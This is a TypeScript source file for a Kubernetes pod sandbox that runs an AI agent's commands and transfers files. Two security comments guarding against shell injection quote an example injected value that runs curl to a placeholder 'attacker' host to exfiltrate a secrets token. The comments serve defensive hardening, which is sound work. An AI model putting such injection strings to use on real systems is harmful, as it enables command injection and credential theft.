/**
 * Kubernetes Pod-based sandbox that implements SandboxProtocol.
 *
 * Creates an AgentSandbox CRD resource, waits for the operator to provision
 * a pod, then executes commands via kubectl exec / K8s API exec.
 */

import type {
  SandboxProtocol,
  ExecResult,
  ExecOptions,
} from "../sandbox-protocol.js";
import type { K8sClient } from "./k8s-client.js";
import type { AgentSandboxSpec } from "./operator-types.js";
import { createAgentSandboxResource } from "./operator-types.js";

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

export interface K8sSandboxConfig {
  /** K8sClient instance for API communication */
  k8sClient: K8sClient;
  /** Kubernetes namespace (default: 'default') */
  namespace?: string;
  /** Default spec overrides applied to every sandbox */
  defaultSpec?: Partial<AgentSandboxSpec>;
  /** Timeout in ms for sandbox creation + readiness (default: 120_000) */
  timeoutMs?: number;
}

// ---------------------------------------------------------------------------
// Implementation
// ---------------------------------------------------------------------------

const DEFAULT_TIMEOUT_MS = 120_000;
const DEFAULT_IMAGE = "node:20-slim";

export class K8sPodSandbox implements SandboxProtocol {
  private readonly client: K8sClient;
  private readonly namespace: string;
  private readonly defaultSpec: Partial<AgentSandboxSpec>;
  private readonly timeoutMs: number;

  private resourceName: string | null = null;
  private podName: string | null = null;

  constructor(config: K8sSandboxConfig) {
    this.client = config.k8sClient;
    this.namespace = config.namespace ?? "default";
    this.defaultSpec = config.defaultSpec ?? {};
    this.timeoutMs = config.timeoutMs ?? DEFAULT_TIMEOUT_MS;
  }

  /** Check if the K8s API server is reachable */
  async isAvailable(): Promise<boolean> {
    try {
      // Try to list the CRD — if the API server and CRD are installed, this works
      const resource = await this.client.getResource(
        "__health-check__",
        this.namespace
      );
      // 404 is fine (resource doesn't exist), we just need a non-error response
      return resource === undefined || resource !== undefined;
    } catch {
      return false;
    }
  }

  /** Execute a command inside the sandbox pod */
  async execute(command: string, options?: ExecOptions): Promise<ExecResult> {
    if (!this.podName) {
      await this.ensurePod();
    }

    const timeout = options?.timeoutMs ?? this.timeoutMs;
    const cwd = options?.cwd ?? "/work";

    const deadline = Date.now() + timeout;

    try {
      // SECURITY (SEC-H-04): `cwd` is model-controlled and must never be
      // interpolated into the shell script text — a value like
      // `x'; curl http://attacker/$(cat /run/secrets/token) ; echo '` would
      // break out and run arbitrary commands in the pod. Instead the cwd is
      // passed as a POSITIONAL argument ($1) to a fixed script, so the shell
      // treats it as data, never code. `${command}` is the caller's own shell
      // command (the sandbox's raison d'être) and is intentionally executed.
      const argv =
        cwd !== "/work"
          ? [
              "sh",
              "-c",
              'cd "$1" && shift && exec "$@"',
              "sh",
              cwd,
              "sh",
              "-c",
              command,
            ]
          : ["sh", "-c", command];

      const result = await this.client.exec(
        this.podName!,
        argv,
        this.namespace
      );

      const timedOut = Date.now() >= deadline;
      return {
        exitCode: result.exitCode,
        stdout: result.stdout,
        stderr: result.stderr,
        timedOut,
      };
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      return {
        exitCode: 1,
        stdout: "",
        stderr: `K8s exec error: ${msg}`,
        timedOut: false,
      };
    }
  }

  /** Upload files to the sandbox pod by exec'ing write commands */
  async uploadFiles(files: Record<string, string>): Promise<void> {
    if (!this.podName) {
      await this.ensurePod();
    }

    for (const [filePath, content] of Object.entries(files)) {
      // Use base64 encoding to safely transfer file content
      const b64 = Buffer.from(content, "utf-8").toString("base64");
      // SECURITY (SEC-H-04): `filePath` is model-controlled. It must NOT be
      // interpolated into the shell script text — a name such as
      // `x'; curl http://attacker/$(cat /run/secrets/token) ; echo '` would
      // break out of the quotes and run arbitrary commands in the pod. Both the
      // path and the base64 payload are passed as POSITIONAL arguments ($1/$2)
      // to a constant script, so the shell treats them as data, never code.
      const result = await this.client.exec(
        this.podName!,
        [
          "sh",
          "-c",
          'mkdir -p "$(dirname "$1")" && printf %s "$2" | base64 -d > "$1"',
          "sh",
          filePath,
          b64,
        ],
        this.namespace
      );
      if (result.exitCode !== 0) {
        throw new Error(`Failed to upload ${filePath}: ${result.stderr}`);
      }
    }
  }

  /** Download files from the sandbox pod */
  async downloadFiles(paths: string[]): Promise<Record<string, string>> {
    if (!this.podName) {
      return {};
    }

    const result: Record<string, string> = {};
    for (const filePath of paths) {
      try {
        const execResult = await this.client.exec(
          this.podName!,
          ["cat", filePath],
          this.namespace
        );
        if (execResult.exitCode === 0) {
          result[filePath] = execResult.stdout;
        }
      } catch {
        // File not found or not readable — skip
      }
    }
    return result;
  }

  /** Delete the CRD resource and associated pod */
  async cleanup(): Promise<void> {
    if (this.resourceName) {
      try {
        await this.client.deleteResource(this.resourceName, this.namespace);
      } catch {
        // Best-effort cleanup
      }
      this.resourceName = null;
      this.podName = null;
    }
  }

  // -----------------------------------------------------------------------
  // Private
  // -----------------------------------------------------------------------

  private async ensurePod(): Promise<void> {
    const name = `forge-sandbox-${Date.now()}-${Math.random()
      .toString(36)
      .slice(2, 8)}`;

    const spec: AgentSandboxSpec = {
      image: DEFAULT_IMAGE,
      securityLevel: "default",
      resources: {
        limits: { cpu: "1", memory: "512Mi" },
        requests: { cpu: "250m", memory: "128Mi" },
      },
      network: { egressPolicy: "deny-all" },
      ...this.defaultSpec,
    };

    const resource = createAgentSandboxResource(name, spec, this.namespace);
    const created = await this.client.createResource(resource);
    this.resourceName = created.metadata.name;

    // Wait for the operator to create the pod and mark it Ready
    const ready = await this.client.waitForPhase(
      name,
      "Ready",
      this.timeoutMs,
      this.namespace
    );
    this.podName = ready.status?.podName ?? name;

    if (!this.podName) {
      throw new Error(
        `AgentSandbox '${name}' reached Ready phase but has no podName in status`
      );
    }
  }
}
